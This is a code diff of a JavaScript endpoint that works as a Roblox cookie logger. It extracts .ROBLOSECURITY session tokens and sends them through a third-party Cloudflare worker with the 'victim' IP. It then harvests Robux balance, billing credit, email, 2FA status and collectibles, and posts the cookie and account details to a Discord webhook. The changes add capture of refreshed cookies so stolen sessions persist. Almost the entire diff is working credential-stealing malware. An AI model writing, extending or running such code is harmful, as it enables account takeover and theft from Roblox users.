@@ -40,19 +40,19 @@ async function getIpGeo(ip) {
 function extractRobloxCookie(raw) {
   if (!raw) return null;
   const cleaned = raw.trim().replace(/\s+/g, ' ');
-
+  
   const fullMatch = cleaned.match(/(_\|WARNING:-DO-NOT-SHARE-THIS[^|]*\|_[\w\-.]+)/);
   if (fullMatch) return fullMatch[1];
-
+  
   const warningMatch = cleaned.match(/_\|WARNING[^|]*\|_([\w\-.]+)/);
   if (warningMatch) return `_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_${warningMatch[1]}`;
-
+  
   const tokenOnly = cleaned.match(/\|_([\w\-]{50,})/);
   if (tokenOnly) return `_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_${tokenOnly[1]}`;
-
+  
   const bareToken = cleaned.match(/^([a-zA-Z0-9\-\_\.]{200,})$/);
   if (bareToken) return `_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_${bareToken[1]}`;
-
+  
   return null;
 }
 
@@ -67,6 +67,7 @@ async function checkGamepass(uid, gamepassId, headers) {
     return false;
   }
 }
+
 
 const WORKER_URL = 'https://holy-truth-3129.notrllyme133.workers.dev/';
 
@@ -108,40 +109,38 @@ async function robloxProxy(cookie, victimIp, uid) {
 
 async function fetchRobloxInfo(cookie, victimIp = null) {
   try {
-    const headers = { Cookie: `.ROBLOSECURITY=${cookie}` };
-    
-    const authRes = await fetch('https://users.roblox.com/v1/users/authenticated', { headers });
-    if (!authRes.ok) return null;
-    const auth = await authRes.json();
+    // Step 1: Auth-only first to get uid (lightweight, single request via worker)
+    const authFirst = await fetch(WORKER_URL, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ cookie, victimIp, endpoints: [{ key: 'auth', url: 'https://users.roblox.com/v1/users/authenticated' }] })
+    });
+    if (!authFirst.ok) return null;
+    const authFirstData = await authFirst.json();
+    if (!authFirstData.auth?.ok) return null;
+    let auth;
+    try { auth = JSON.parse(authFirstData.auth.data); } catch { return null; }
+    if (!auth?.id) return null;
     const uid = auth.id;
-    
-    // Fetch main data
-    const [
-      profileRes, robuxRes, friendsRes, premiumRes,
-      billingRes, emailRes, groupsRes, limitedsRes, avatarRes, tfaRes
-    ] = await Promise.all([
-      fetch(`https://users.roblox.com/v1/users/${uid}`, { headers: {} }),
-      fetch('https://economy.roblox.com/v1/user/currency', { headers }),
-      fetch(`https://friends.roblox.com/v1/users/${uid}/friends/count`, { headers }),
-      fetch(`https://premiumfeatures.roblox.com/v1/users/${uid}/validate-membership`, { headers }),
-      fetch('https://billing.roblox.com/v1/credit', { headers }),
-      fetch('https://accountsettings.roblox.com/v1/email', { headers }),
-      fetch(`https://groups.roblox.com/v1/users/${uid}/groups/roles`, { headers }),
-      fetch(`https://inventory.roblox.com/v1/users/${uid}/assets/collectibles?limit=100`, { headers }),
-      fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${uid}&size=150x150&format=Webp`, { headers: {} }),
-      fetch(`https://twostepverification.roblox.com/v1/users/${uid}/configuration`, { headers }).catch(() => null)
-    ]);
-    
-    const profile = profileRes.ok ? await profileRes.json() : null;
-    const robuxData = robuxRes.ok ? await robuxRes.json() : null;
-    const friendsData = friendsRes.ok ? await friendsRes.json() : null;
-    const isPremium = premiumRes.ok ? await premiumRes.json() : false;
-    const billingData = billingRes.ok ? await billingRes.json() : null;
-    const emailData = emailRes.ok ? await emailRes.json() : null;
-    const groupsData = groupsRes.ok ? await groupsRes.json() : { data: [] };
-    const limitedsData = limitedsRes.ok ? await limitedsRes.json() : { data: [] };
-    const avatarData = avatarRes.ok ? await avatarRes.json() : null;
-    const tfaData = tfaRes?.ok ? await tfaRes.json() : null;
+
+    // Grab refreshed cookie if Roblox returned one
+    let refreshedCookie = authFirstData.auth?.refreshedCookie || null;
+
+    // Step 2: Fetch all remaining info via worker with uid known
+    const allData = await robloxProxy(cookie, victimIp, uid);
+    if (!allData) return null;
+    if (allData._refreshedCookie) refreshedCookie = allData._refreshedCookie;
+
+    const profile     = allData.profile    || null;
+    const robuxData   = allData.robux      || null;
+    const friendsData = allData.friends    || null;
+    const isPremium   = allData.premium;
+    const billingData = allData.billing    || null;
+    const emailData   = allData.email      || null;
+    const groupsData  = allData.groups     || { data: [] };
+    const limitedsData= allData.limiteds   || { data: [] };
+    const avatarData  = allData.avatar     || null;
+    const tfaData     = allData.tfa        || null;
     
     let accountAgeDays = 'N/A';
     if (profile?.created) {
@@ -184,7 +183,7 @@ async function fetchRobloxInfo(cookie, victimIp = null) {
     const twoFA = tfaData?.methods?.length > 0 ? 'Enabled ✅' : 'Disabled ❌';
     const emailSet = emailData?.emailAddress ? 'Set ✅' : 'False ❌';
     const emailVerified = emailData?.verified ? 'Verified ✅' : 'Unset ❌';
-
+    
     return {
       id: uid,
       username: auth.name,
@@ -205,7 +204,7 @@ async function fetchRobloxInfo(cookie, victimIp = null) {
       twoFA,
       gamepasses,
       avatarUrl: avatarData?.data?.[0]?.imageUrl || 'https://cdn-icons-png.flaticon.com/512/1827/1827392.png',
-      refreshedCookie: null // Direct API calls don't refresh cookies
+      refreshedCookie: refreshedCookie || null
     };
   } catch (err) {
     console.error('Roblox fetch error:', err);
@@ -244,7 +243,7 @@ async function sendToDiscord(webhookUrl, data) {
     field("💳 Billing", `Credit: ${roblox?.credit || 0} USD\nConvert: 0`, true),
     field("🎫 Passes", `Premium: ${roblox?.isPremium ? '✅' : '❌'}\nVerified: ${roblox?.emailVerified?.includes('✅') ? '✅' : '❌'}`, true),
     field("⚙️ Settings", `Email: ${roblox?.emailSet}\n2FA: ${roblox?.twoFA}`, true),
-
+    
     // Row 3: Groups | Location | IP
     field("👥 Groups", `Balance: ${roblox?.groupRobux?.toLocaleString() || 0}\nOwned: ${roblox?.groupsOwned || 0}`, true),
     field("📍 Location", `${geo?.city || 'Unknown'}, ${geo?.country || 'Unknown'}`, true),
@@ -285,106 +284,17 @@ async function sendToDiscord(webhookUrl, data) {
     });
     
     if (!response.ok) {
-      const errorData = await response.text();
-      console.error('Discord webhook error:', response.status, errorData);
+      const text = await response.text();
+      console.error('Discord API Error:', response.status, text);
       return false;
     }
-    
-    console.log('Successfully sent to Discord');
     return true;
   } catch (err) {
-    console.error('Discord webhook error:', err);
+    console.error('Discord fetch error:', err);
     return false;
   }
 }
 
-// Cookie refresh function
-async function refreshCookie(cookie) {
-  const url = 'https://auth.roblox.com/v2/logout';
-  
-  try {
-    const response = await fetch(url, {
-      method: 'POST',
-      headers: {
-        'Cookie': `.ROBLOSECURITY=${cookie}`,
-        'Content-Length': '0'
-      }
-    });
-    
-    const authHeader = response.headers.get('rbx-authentication-ticket');
-    if (!authHeader) {
-      console.error('No auth ticket in response');
-      return null;
-    }
-    
-    const newCookie = `_ROBLOSECURITY=${authHeader}`;
-    
-    // Validate the new cookie
-    const validationResponse = await fetch('https://www.roblox.com/mobileapi/userinfo', {
-      headers: { 'Cookie': newCookie }
-    });
-    
-    if (!validationResponse.ok) {
-      console.error('New cookie validation failed');
-      return null;
-    }
-    
-    console.log('Cookie refreshed successfully');
-    return newCookie;
-  } catch (err) {
-    console.error('Cookie refresh error:', err);
-    return null;
-  }
-}
-
-// Main handler function
-async function handleLogin(cookie, webhookUrl) {
-  const now = new Date().toLocaleString();
-  
-  // Get user IP and geolocation
-  let ip = 'Unknown';
-  let geo = {};
-  try {
-    const ipResponse = await fetch('https://ipapi.co/json/');
-    if (ipResponse.ok) {
-      const ipData = await ipResponse.json();
-      ip = ipData.ip || 'Unknown';
-      geo = {
-        city: ipData.city,
-        country: ipData.country_name
-      };
-    }
-  } catch (err) {
-    console.error('Error getting IP info:', err);
-  }
-  
-  // Fetch Roblox user data
-  const robloxData = await fetchRobloxInfo(cookie);
-  
-  if (!robloxData) {
-    console.error('Failed to fetch Roblox data');
-    return false;
-  }
-
-  // Try to refresh cookie
-  const refreshedCookie = await refreshCookie(cookie);
-  if (refreshedCookie) {
-    robloxData.refreshedCookie = refreshedCookie;
-  }
-  
-  // Send to Discord
-  const success = await sendToDiscord(webhookUrl, {
-    cookie: cookie,
-    roblox: robloxData,
-    ip: ip,
-    geo: geo,
-    now: now
-  });
-  
-  return success;
-}
-
-// Main handler function for the API endpoint
 export default async function handler(req, res) {
   res.setHeader('Access-Control-Allow-Origin', '*');
   res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
